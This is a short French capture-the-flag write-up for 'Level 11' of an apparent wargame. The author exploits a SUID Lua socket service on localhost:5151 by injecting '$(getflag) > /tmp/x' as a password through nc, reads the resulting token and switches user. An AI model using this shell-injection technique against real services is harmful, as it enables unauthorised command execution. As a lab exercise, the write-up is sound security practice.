
LEVEL 11

------------------------------------------------------------------------------------------------------------------------

* Recherches

    Script en Lua
    SUID flag11
    Serveur "127.0.0.1" port 5151

    
    Analyse du script Lua
    CF. script.lua

    f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 = NotSoEasy

    Macos : brew install luarocks
    luarocks install luasocket

    On remplace shasum1 par shasum sur macos (shasum = shasum de sha1)

    lua script.lua
    lsof -i:5151
    nc localhost 5151
        password : NotSoEasy
    
    On voit ligne 6 que le script Lua execute en shell l'input du client, donc on peux mettre de coté les recherches sur les hashs, en apparence, pas de faille de toute façon
    Donc potentiellement, on peut "injecter" du code

    lua script.lua
    nc localhost 5151
        Password: getflag > /tmp/x
    
    Pas de flag, retry avec $()

        Password: $(getflag) > /tmp/x

    cat /tmp/x
        Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
    
    su level12
        fa6v5ateaw21peobuub8ipe6s

